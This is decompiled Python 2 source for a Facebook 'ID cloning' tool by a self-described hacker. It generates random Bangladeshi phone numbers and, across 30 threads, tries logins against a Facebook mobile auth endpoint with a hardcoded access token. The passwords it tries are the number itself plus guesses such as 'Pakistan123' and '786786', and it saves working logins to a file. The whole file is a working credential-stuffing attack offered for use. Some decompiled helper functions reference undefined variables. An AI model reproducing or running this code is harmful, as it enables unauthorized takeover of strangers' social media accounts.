# Source Generated with Decompyle++
# File: out.pyc (Python 2.7)

import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import getpass
os.system('rm -rf .txt')
for n in range(10000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()


try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')


try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 Red-Mafia404')

import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import requests
import mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [
    ('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [
    ('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
    print 'Thanks.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i
    
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
    
    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)
    


def tik():
    titik = [
        '.   ',
        '..  ',
        '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;91m' + o,
        sys.stdout.flush()
        time.sleep(1)
    

back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
print "\n \n\x1b[1;96m\n\n\n_______    _____ ____  ____    _      ______    \n|_   __ \\  |_   _|_  _||_  _|  / \\    |_   _ `.  \n  | |__) |   | |   \\ \\  / /   / _ \\     | | `. \\ \n  |  __ /    | |    \\ \\/ /   / ___ \\    | |  | | \n _| |  \\ \\_ _| |_   _|  |_ _/ /   \\ \\_ _| |_.' / \n|____| |___|_____| |______|____| |____|______.'  \n                                           Version 2.0\n          \x1b[1;91m   FUCK YOU HATERS\n \n \n \n\x1b[1;96m---------------------RR-Hacker---------------------\n                \n\x1b[0;95m\xe2\x95\xad\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xae\n\x1b[0;91m\xe2\x95\x91\x1b[0;92mAUTHOR : \x1b[0;92m RR-Hacker                                \n\x1b[0;91m\xe2\x95\x91\x1b[0;91m FB :\x1b[0;92m Abubockor-Riyad                                             \n\x1b[0;95m\xe2\x95\xb0\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xaf\n             \n                \n\x1b[1;96m-----------------If you are bad Then I am your dad----------------------\n"
logo1 = '\n \n    \n \n\x1b[1;93m\xf0\x9f\x94\xb4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x9d\x96Abubockor-Riyad [RR] \xe2\x9d\x96\xe2\x9d\x96\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xf0\x9f\x94\xb4\n\x1b[1;93m\n\x1b[1;93m\xe2\x99\xa5\xf0\x9f\x9b\x91\xe2\x96\x86\xe2\x96\xac\xe2\x96\xad\xe2\x96\xac\xe2\x96\xad\xe2\x96\xac\xe2\x96\xad\xe2\x96\xac\xe2\x96\xad\xe2\x96\xac\xe2\x96\xad\xe2\x96\x86\xf0\x9f\x9b\x91\xe2\x99\xa5\n\x1b[1;93m \xe2\x96\x9b\xe2\x96\x82\xe2\x96\x85\xf0\x9f\x9b\x91\xf0\x9f\x92\xa2\xf0\x9f\x85\x9a\xf0\x9f\x85\x98\xf0\x9f\x85\x9d\xf0\x9f\x85\x96\xf0\x9f\x92\xa2\xf0\x9f\x9b\x91\xe2\x96\x84\xe2\x96\x82\xe2\x96\x9c\n\x1b[1;93 m\n\x1b[1;93m\xf0\x9f\x94\xb4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x9d\x96\xe2\x9d\x96Your DAD\xe2\x9d\x96\xe2\x9d\x96\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81 \xf0\x9f\x94\xb4\n \n \n\x1b[1;96m We are RR Hacker\xf0\x9f\x92\x9c\n\x1b[1;96mOnly Bangladesh Id Hack\xf0\x9f\x92\x9c\n \n\x1b[1;99m If you face any problem contact me on Whatsapp +8801710375092\xf0\x9f\x92\x9c\n \n\x1b[1;96m------------------THE RR\xf0\x9f\x92\x9cHACKER----------------------\n \n \n\x1b[0;95m\xe2\x95\xad\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xae\n\x1b[0;91m\xe2\x95\x91\x1b[0;92mAUTHOR : \x1b[0;92mAbubockor Riyad [RR]                                    \n\x1b[0;91m\xe2\x95\x91\x1b[0;91mWhatsApp No:\x1b[0;92m +8801710375092                                           \n\x1b[0;95m\xe2\x95\xb0\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xaf\n \n\x1b[1;96m-----------------RR\xf0\x9f\x92\x9cHACKER------------------------\n'
logo2 = "\n \n\x1b[1;96m\n\n\n_______    _____ ____  ____    _      ______    \n|_   __ \\  |_   _|_  _||_  _|  / \\    |_   _ `.  \n  | |__) |   | |   \\ \\  / /   / _ \\     | | `. \\ \n  |  __ /    | |    \\ \\/ /   / ___ \\    | |  | | \n _| |  \\ \\_ _| |_   _|  |_ _/ /   \\ \\_ _| |_.' / \n|____| |___|_____| |______|____| |____|______.'  \n                                           Version 2.0\n   \x1b[1;91m   FUCK YOU HATERS\n   \n\x1b[1;91m \xf0\x9f\x94\xb4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x9d\x96\xe2\x9d\x96ABUBOCKOR-RIYAD(RR)\xe2\x9d\x96\xe2\x9d\x96\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xf0\x9f\x94\xb4\n\x1b[1;91m  ONLY RR \xf0\x9f\x98\x88\xf0\x9f\x92\x9c\n \n\x1b[1;96m--------------------- RR--------------------\n \n    \n \n\x1b[1;95mOld IDs Cloning \xf0\x9f\x98\x87\n \n                                                \n\x1b[1;96m--------------------- ABUBOCKOR-RIYAD --------------------\n"
CorrectUsername = 'RR'
CorrectPassword = 'RIYAD'
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;97m\xf0\x9f\x98\xb4 \x1b[1;91mTool Username \x1b[1;97m\xc2\xbb\xc2\xbb \x1b[1;97m')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;97m\xf0\x9f\x98\xb4 \x1b[1;91mTool Password  \x1b[1;97m\xc2\xbb \x1b[1;97m')
        if password == CorrectPassword:
            print 'Logged in successfully as ' + username
            time.sleep(2)
            loop = 'false'
        else:
            print '\x1b[1;94mWrong Password'
            os.system('xdg-open https://wa.me/+8801710375092 ')
    print '\x1b[1;94mWrong Username'
    os.system('xdg-open https://www.facebook.com/groups/2025882650927896/?ref=share ')

def lisensi():
    os.system('clear')
    login()


def login():
    os.system('clear')
    print logo1
    print '\x1b[1;95m[1]\x1b[1;92mfor start press 1 ( \x1b[1;95m NEW UPDATE )'
    time.sleep(0.05)
    print '\x1b[1;94m[2]\x1b[1;91m Exit ( press 2)'
    pilih_login()


def pilih_login():
    peak = raw_input('\n\x1b[1;95mCHOOSE: \x1b[1;93m')
    if peak == '':
        print '\x1b[1;97mFill In Correctly'
        pilih_login()
    elif peak == '1':
        Zeek()


def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;93m[1]  START CLONING'
    time.sleep(0.1)
    print '\x1b[1;94m[3] back'
    time.sleep(0.05)
    action()


def action():
    peak = raw_input('\n\x1b[1;97mCHOOSE:\x1b[1;97m')
    if peak == '':
        print '[!] Fill In Correctly'
        action()
    elif peak == '1':
        os.system('clear')
        print logo2
        print 'Enter any Bangladesh Mobile number code for cloning' + '\n'
        print 'Enter any code 1 to 49'
        
        try:
            c = raw_input('\x1b[1;97mCHOOSE : ')
            k = '03'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            blackmafiax()
        

    if peak == '0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50 * '\x1b[1;94m-'
    xxx = str(len(id))
    jalan('\x1b[1;96m\xe2\x96\xacPROGRAMED BY Abubockor Riyad [RR]')
    jalan('\x1b[1;96m\xe2\x96\xac\xe2\x96\xacDOCTOR OF HACKING AND SPAMING')
    jalan('\x1b[1;96m\xe2\x96\xac\xe2\x96\xac\xe2\x96\xacPROGRAMER')
    jalan('\x1b[1;96m\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xacSPAMING')
    jalan('\x1b[1;96m\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xacHACKER')
    jalan('\x1b[1;96m\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xacTHE WARNING ZONE 2.0')
    jalan('\x1b[1;96m\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xacENJOY')
    jalan('\x1b[1;96m Total Number of IDs: ' + xxx)
    jalan('\x1b[1;95mCode you choosed: ' + c)
    jalan('\x1b[1;94mWait A While Start Cloning...')
    jalan('\x1b[1;93mTo Stop Process Press Ctrl+z')
    print 50 * '\x1b[1;97m-'
    
    def main(arg):
        user = arg
        
        try:
            os.mkdir('save')
        except OSError:
            pass

        
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[RR-OK]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/cloned.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m[RR-OK] ' + k + c + user + '  |  ' + pass1
                cps = open('save/cloned.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + c + user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[RR-OK]  ' + k + c + user + '  |  ' + pass2
                    okb = open('save/cloned.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;92m(\xf0\x9f\xa5\xbaaftr-7-open) ' + k + c + user + '  |  ' + pass2
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = 'Pakistan123'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m(oftr-7-open)  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;92m[RR-OK] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/cloned.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = 'Pakistan'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[RR-OK]  ' + k + c + user + '  |  ' + pass4
                            okb = open('save/cloned.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;92m[RR-CP] ' + k + c + user + '  |  ' + pass4
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = '786786'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[RR-CP]  ' + k + c + user + '  |  ' + pass5
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[RR-CP] ' + k + c + user + '  |  ' + pass5
                                cps = open('save/cloned.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : ' + str(len(oks)) + '/' + str(len(cpb))
    print 'Cloned Accounts Has Been Saved : save/cloned.txt'
    jalan('Note : Your CP account Will Open after 7 to 10 days')
    print ''
    print '\n    \xe2\x96\x91\xe2\x96\x90\xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x94\x80\xe2\x96\x92\xe2\x96\x80\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x80\xe2\x96\x91\xe2\x96\x90\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\n    \xe2\x96\x91\xe2\x96\x90\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x92\xe2\x96\x80\xe2\x96\x84\xe2\x96\x91\xe2\x96\x84\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x90\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\n    \xe2\x96\x91\xe2\x96\x90\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x92\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x90\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\n    \n    Jani Log \xf0\x9f\x92\x9c\n \n \n \n\x1b[1;96mThanks me later\n\x1b[1;95mFb\x1b[1;97Abubockor Riyad \n\x1b[1;95mFB Group\x1b[1;97mhttps://www.facebook.com/groups/2025882650927896/?ref=share'
    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
    login()

if __name__ == '__main__':
    login()
